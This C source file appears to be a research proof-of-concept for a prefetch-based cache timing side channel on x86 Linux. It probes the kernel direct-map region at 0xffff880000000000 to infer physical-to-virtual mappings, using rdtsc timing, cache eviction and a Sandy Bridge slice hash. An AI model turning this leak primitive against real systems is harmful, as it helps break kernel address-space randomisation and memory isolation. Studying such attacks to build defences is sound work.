#define _GNU_SOURCE
#include <pthread.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>


uint64_t map[16];
char* array;
size_t hit_histogram[1000*1000];
size_t miss_histogram[1000*1000];
volatile size_t evict_array[2*1024*1024];

#define ADDR_COUNT (16)
uint64_t* eset[ADDR_COUNT];

int g_pagemap_fd = -1;

#define assert(X) do { if (!(X)) { fprintf(stderr,"assertion '" #X "' failed\n"); exit(-1); } } while (0)

#define maccess(X) (*(volatile size_t*)X)


inline __attribute__((always_inline)) void prefetch(uint64_t p)
{
    //__builtin_prefetch((void*)p, 0, 0); //prefetchnta 
    //__builtin_prefetch((void*)p, 0, 1); //prefetcht2     
    asm volatile ("prefetchnta (%0)" : : "r" (p));
    asm volatile ("prefetcht2 (%0)" : : "r" (p));
}

uint64_t evict_all(uint64_t phys)
{
  uint64_t sum = -1ULL;
  asm volatile ("mfence\n\t");
  for(size_t i=0; i<2*1024*1024; i += 64/sizeof(size_t))
  {
    sum += evict_array[i]++;
  }
  asm volatile ("mfence\n\t");
  return sum;
}

inline __attribute__((always_inline)) uint64_t _rdtsc_begin() {
  uint64_t a, d;
  asm volatile ("mfence\n\t"
    "xor %%rax, %%rax\n\t"
    "cpuid\n\t"
    "rdtsc\n\t"
    "mov %%rdx, %0\n\t"
    "mov %%rax, %1\n\t"
    "mfence\n\t"
    : "=r" (d), "=r" (a)
    :
    : "%rax", "%rbx", "%rcx", "%rdx");
  a = (d<<32) | a;
  return a;
}

inline __attribute__((always_inline)) uint64_t _rdtsc_end() {
  uint64_t a, d;
  asm volatile("mfence\n\t"
    "rdtsc\n\t"
    "mov %%rdx, %0\n\t"
    "mov %%rax, %1\n\t"
    "xor %%rax, %%rax\n\t"
    "cpuid\n\t"
    "mfence\n\t"
    : "=r" (d), "=r" (a)
    :
    : "%rax", "%rbx", "%rcx", "%rdx");
  a = (d<<32) | a;
  return a;
}


uint64_t get_physical_addr(void* virtual_addr_p) {
  uint64_t start = (uint64_t)(((uint32_t)array+(6+2)*1024*1024) >> 21 << 21);  
  uint64_t offset = ((uint64_t)(uint32_t)virtual_addr_p) - start;
  offset /= 2*1024*1024;
  assert(offset < 8);
  return map[offset] + (((uint64_t)(uint32_t)virtual_addr_p) & (2*1024*1024-1));
}

int get_cache_slice(uint64_t phys_addr, int bad_bit) {

  // XOR of h1 and h2:
  static const int h0[] = { 6, 10, 12, 14, 16, 17, 18, 20, 22, 24, 25, 26, 27, 28, 30, 32, 33, 35, 36 };

  int count = sizeof(h0) / sizeof(h0[0]);
  int hash = 0;
  for (int i = 0; i < count; i++) {
    hash ^= (phys_addr >> h0[i]) & 1;
  }
  return hash;
}

size_t in_same_cache_set(uint64_t phys1, uint64_t phys2, int bad_bit) {
  // For Sandy Bridge, the bottom 17 bits determine the cache set
  // within the cache slice (or the location within a cache line).
  uint64_t mask = ((uint64_t) 1 << 17) - 1;
  return ((phys1 & mask) == (phys2 & mask) &&
          get_cache_slice(phys1, bad_bit) == get_cache_slice(phys2, bad_bit));
}


void pick(uint64_t paddr,char* max)
{
  size_t found = 0;
  char* i = (char*)((((size_t)array)+(2+6)*1024*1024) >> 21 << 21);
  while (found < ADDR_COUNT)
  {
    for (; i < max; i += 64)
    {
      fflush(stdout);
      uint64_t paddr2 = get_physical_addr(i);
      if (paddr != paddr2 && in_same_cache_set(paddr, paddr2, -1)) {
        eset[found] = (uint64_t*)i;
        printf("found %p -> %llx\n",i,paddr2);
        found++;
      }
      if (found >= ADDR_COUNT)
        break;
    }
  }
}

inline __attribute__((always_inline)) size_t onlyreload(void* addr, uint64_t phys)
{
  _rdtsc_begin();
  // Three shall be the number thou shalt count, and the number of the counting shall be three. Four shalt thou not count, neither count thou two, excepting that thou then proceed to three.
  for (size_t i = 0; i < 3; ++i)
  {
    sched_yield();
    prefetch(phys);
  }
  size_t time = _rdtsc_begin();
  maccess(addr);
  size_t delta = _rdtsc_end() - time;
  evict_all(phys);
  return delta;
}

inline __attribute__((always_inline)) size_t flushandreload(void* addr, uint64_t phys)
{
  size_t time = _rdtsc_begin();
  maccess(addr);
  size_t delta = _rdtsc_end() - time;
  evict_all(phys);
  return delta;
}

pthread_t nopthread[4];

void* noploop()
{
  while(1)
    asm("nop");
}

#define TRIES (1024)

int main(int argc, char** argv)
{
  //pthread_create(nopthread+0,0,noploop,0);
  
  unsigned long long i;
  for(i=0; i<1024*1024; i++)
  {
    evict_array[i] = i;
  }
  char* line;
  size_t n;
  
  array = mmap(NULL, 1024*1024*1024, PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
  char* p = (void*)((size_t)array+2*1024*1024 >> 21 << 21);
  printf("ready?\n");
  fflush(stdout);
  getchar();

  printf("skip %p\n",p);
  memset(p,-1,1*1024*1024);
  p += 1*1024*1024;
  printf("skip %p\n",p);
  memset(p,-1,1*1024*1024);
  p += 1*1024*1024;
  printf("skip %p\n",p);
  memset(p,-1,1*1024*1024);
  p += 1*1024*1024;
  printf("skip %p\n",p);
  memset(p,-1,1*1024*1024);
  p += 1*1024*1024;
  printf("skip %p\n",p);
  memset(p,-1,1*1024*1024);
  p += 1*1024*1024;
  printf("skip %p\n",p);
  memset(p,-1,1*1024*1024);
  p += 1*1024*1024;
  
  size_t map_cntr = 0;
  while (map_cntr < 1)
  {
    printf("what is the address of %p?\n",p);
    fflush(stdout);
    memset(p,-1,2*1024*1024);
    getline(&line,&n,stdin);
    if (!((line[0] >= '0' && line[0] <= '9') || (line[0] >= 'a' && line[0] <= 'f')))
      map[map_cntr++] = 0;
    else
    {
      char* end = 0;
      map[map_cntr++] = strtoull(line,&end,16);
      printf("-> stored %llx\n",map[map_cntr-1]);
    }
    p += 2*1024*1024;
  }

  memset(array,-1,1024*1024*1024);

  uint64_t iaddr = 0xffff880000000000ull + map[0];

  
  void* virt = (void*)(((size_t)array+(6+1)*1024*1024) >> 21 << 21);

  printf("%16p -> %16llx -> %16llx\n",virt,map[0], iaddr);
//  pick(map[3],virt);

  memset(array,-1,1024*1024*1024);
  maccess(virt);
  
while (1)
{
  printf("ready?\n");
  fflush(stdout);
  getchar();

  for (uint64_t phys = iaddr - 4*2*1024*1024; phys < iaddr + 4*2*1024*1024; phys += 2*1024*1024)
  {
    virt = (void*)((((size_t)virt >> 21) << 21) | ((uint32_t)phys & (2*1024*1024-1)));
    memset(hit_histogram,0,1000000*sizeof(size_t));
    memset(miss_histogram,0,1000000*sizeof(size_t));
    ssize_t i = TRIES;
    size_t d = onlyreload(virt,phys);
    while (i-- > 0)
    {
      d = onlyreload(virt,(uint64_t)(uint32_t)virt);
      hit_histogram[d]++;
      if (d > 250)
        continue;
    }
    i = 2048;
/*    while (i-- > 0)*/
/*    {*/
/*      size_t d = flushandreload(virt,phys);*/
/*      miss_histogram[d]++;*/
/*    }*/
sched_yield();
    size_t hit_min_i = -1;
    size_t miss_min_i = 12000;
    size_t hit_sum = 0;
    size_t miss_sum = 0;
    for (size_t i = 0; i < 200; ++i)
    {
      //printf("%8zu: %8zu\n",i,hit_histogram[i]);
      hit_sum += hit_histogram[i];
      miss_sum += hit_histogram[i] * i;
      if (hit_min_i > i && hit_histogram[i] > 0)
        hit_min_i = i;
      if (miss_min_i > i && miss_histogram[i] > 0)
        miss_min_i = i;
    }

//    printf("%16p,%16zx,%8zu,%8zu\n",virt,phys,hit_min_i,hit_sum);
//    if (hit_min_i < 200)
      printf("%16p vs. %16zx%s: hit: %8zu (%8zu, avg: %8zu)\n",virt,phys,phys == iaddr ? "*":" ",hit_min_i,hit_sum,miss_sum/hit_sum);
/*    else
    {
      if (iaddr == phys)
        printf("*");
      else
        printf(".");
    }*/
    fflush(stdout);
    /*if((phys/(4*1024))%512 > 0)
    {
      phys = (((phys >> 21) + 1) << 21) - 4*1024;
    }*/
  }
}
  return 0;
}
